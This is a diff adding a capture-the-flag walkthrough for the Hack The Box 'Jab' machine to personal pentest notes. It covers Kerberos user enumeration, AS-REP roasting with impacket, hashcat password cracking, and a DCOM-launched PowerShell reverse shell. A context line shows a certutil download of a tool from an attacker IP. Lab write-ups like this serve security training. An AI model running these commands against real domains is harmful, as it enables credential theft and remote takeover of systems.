@@ -977,3 +977,121 @@ certutil.exe -urlcache -split -f "http://IP:8000/RunasCs.exe" ".\RunasCs.exe"
 10\. We got the Admin Flag \~
 
 <figure><img src="https://miro.medium.com/v2/resize:fit:381/1*sqJzXkU2WmJy9QfBnj8XXg.png" alt="" height="60" width="381"><figcaption></figcaption></figure>
+
+## Jab
+
+### Reco
+
+#### nmap
+
+* open ports:
+  * 53 DNS
+  * 88 Kerberos
+  * 135 MSRPC
+  * 129 Netbios
+  * 289, 3268, 3269 LDAP
+  * 445 MS-DS
+  * 464 kpasswd5
+  * 593 ncacn\_htto (RPC over HTTP 1.0)
+  * 636 SSL LDAP
+  * 5222 jabber
+  * 5269 xmpp
+  * 7070 realserver
+  * 7443 ssl/oracleas-https
+  * 7777 socks5
+
+#### hosts
+
+* add jab.htb & DC01.jab.htb
+
+<figure><img src=".gitbook/assets/image (160).png" alt=""><figcaption></figcaption></figure>
+
+### Weaponisation
+
+Pidgin
+
+* `sudo apt install pidgin`
+* Pidgin is a chat program which lets you log into accounts on multiple chat networks simultaneously. This means that you can be chatting with friends on XMPP and sitting in an IRC channel at the same time.
+* Pidgin is compatible with the following chat networks out of the box: Jabber/XMPP, Bonjour, Gadu-Gadu, IRC, Novell GroupWise Messenger, Lotus Sametime, SILC, SIMPLE, and Zephyr.
+
+Kerbrute
+
+* we are gonna try to bruteforce some user creds for kerberos service
+* `./kerbrute userenum --dc dc01.jab.htb -d jab.htb /usr/share/seclists/usernames/xato-net-10-million-usernames.txt`
+
+<figure><img src=".gitbook/assets/image (162).png" alt=""><figcaption></figcaption></figure>
+
+#### CVE
+
+* **CVE-2023-32315**
+  * vuln in Openfire XMPP Server
+    * Openfire is an XMPP server licensed under the Open Source Apache License. Openfire's administrative console, a web-based application, was found to be vulnerable to a path traversal attack via the setup environment. This permitted an unauthenticated user to use the unauthenticated Openfire Setup Environment in an already configured Openfire environment to access restricted pages in the Openfire Admin Console reserved for administrative users. This vulnerability affects all versions of Openfire that have been released since April 2015, starting with version 3.10.0. The problem has been patched in Openfire release 4.7.5 and 4.6.8, and further improvements will be included in the yet-to-be released first version on the 4.8 branch (which is expected to be version 4.8.0). Users are advised to upgrade. If an Openfire upgrade isn’t available for a specific release, or isn’t quickly actionable, users may see the linked github advisory (GHSA-gw42-f939-fhvm) for mitigation advice.
+
+### Exploitation
+
+impacket tool
+
+* cd impacket/examples
+* `GetUserSPNs.py -no-preauth 'jmontgomery' -dc-ip dc01.jab.htb -usersfile Users.txt jab.htb`
+  * `we obtained the hash of user jmontgomery`
+
+`hashcat`
+
+* hashcat -m 18200 hash.txt rockyou.txt
+  * 18200 stands for kerberos cracking mode
+  * hash.txt is obtained hash from previous step
+  * rockyou.txt is dictionary
+* output
+  * PW = Midnight\_121
+
+Pidgin app
+
+* add account&#x20;
+  * Protocol = `XMPP`
+  * UN = `jmontgomery`
+  * D = `dc01.jab.htb`
+  * PW = `Midnight_121`
+
+<figure><img src=".gitbook/assets/image (163).png" alt=""><figcaption></figcaption></figure>
+
+* join a chat
+  * room list -> pentest2003
+
+<figure><img src=".gitbook/assets/image (164).png" alt=""><figcaption></figcaption></figure>
+
+* when reading the pentest discussion, there is a mention about svc\_openfire user ahd his cracked password
+  * add another acount in Pidgin
+  * Protocol: `XMPP`
+  * UN: `svc_openfire`
+  * D: `dc01.jab.htb`
+  * PW: `!@#$%^&*(1qazxsw`
+* join a chat
+  * unfortunatelly, only two test rooms, nothing valuable
+
+### User flag
+
+Impacket & RS
+
+* `nc -nlvp <PORT>`
+* `impacket-dcomexec -object MMC20 -nooutput jab.htb/svc_openfire:'!@#$%^&*(1qazxws'@dc01.jab.htb 'powershell -e ......'`
+  * POWERSHELL -E STRING
+    * revshells.com
+      * IP - machine IP
+      * Port - \<PORT>
+      * OS - Windows
+        * PowerShell #3 (Base64)
+      * Shell - Powershell
+      * Encoding - None
+
+<figure><img src=".gitbook/assets/image (165).png" alt=""><figcaption></figcaption></figure>
+
+* we obtained a reverse shell
+  * `cd C:\Users\svc_openfire\Desktop`
+  * `type user.txt`
+
+<figure><img src=".gitbook/assets/image (166).png" alt=""><figcaption></figcaption></figure>
+
+### Root flag
+
+* Get root flag from openfire admin console with malicious plugin
+  * TBD
